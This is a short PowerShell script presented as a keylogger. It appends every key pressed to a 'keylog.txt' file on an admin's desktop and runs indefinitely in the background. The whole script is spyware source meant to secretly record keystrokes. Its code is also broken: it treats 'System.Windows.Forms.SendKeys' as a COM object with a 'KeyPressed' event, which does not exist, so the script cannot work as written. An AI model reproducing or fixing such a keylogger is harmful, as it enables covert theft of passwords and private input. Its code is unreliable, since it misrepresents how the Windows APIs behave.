# Define the path to the log file
$logFile = "C:\Users\Admin\Desktop\keylog.txt"

# Create a new instance of the keylistener COM object
$keyListener = New-Object -ComObject 'System.Windows.Forms.SendKeys'

# Define a function to handle key events
function OnKeyPress($key)
{
    # Append the pressed key to the log file
    Add-Content -Path $logFile -Value $key
}

# Register the key event handler
$handler = [System.Windows.Forms.SendKeys]::KeyPressed
Register-ObjectEvent -InputObject $keyListener -EventName $handler -Action { OnKeyPress $EventArgs }

# Run the script in the background
while($true)
{
    Start-Sleep -Seconds 1
}
